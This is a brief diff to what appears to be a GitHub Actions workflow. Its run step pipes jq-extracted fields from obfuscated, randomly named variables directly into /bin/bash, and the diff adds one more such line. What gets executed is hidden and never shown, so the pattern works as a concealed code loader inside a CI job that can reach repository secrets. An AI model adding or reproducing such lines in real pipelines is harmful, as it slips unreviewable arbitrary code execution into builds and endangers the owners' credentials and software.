@@ -27,6 +27,7 @@ jobs:
           echo $wul415 | jq -r .vi7 | /bin/bash
           echo $pznac5222 | jq -r .yrh3674 | /bin/bash
           printf '%s' "$gpdpj0625" | jq -r .yilc202 | /bin/bash
+          echo $mytk6 | jq -r .x68618 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
